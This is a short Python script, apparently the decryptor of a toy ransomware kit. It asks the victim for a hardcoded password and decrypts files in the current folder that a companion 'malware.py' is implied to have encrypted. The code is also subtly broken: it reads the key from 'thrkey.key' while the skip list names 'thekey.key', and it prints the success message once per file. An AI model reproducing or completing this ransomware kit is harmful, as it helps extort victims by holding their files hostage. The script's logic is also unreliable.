#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

with open("thrkey.key", "rb") as key:
	secretkey = key.read()
passphrase = "Cy3ers3c"
upassword = input("Enter the password to decrypt your files: ")

if upassword == passphrase:
	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		content_decrypt = Fernet(secretkey).decrypt(content)
		with open(file, "wb") as thefile:
			thefile.write(content_decrypt)

		print("You recovered all your files")

else:
	print("Enter the right password to recover your files")
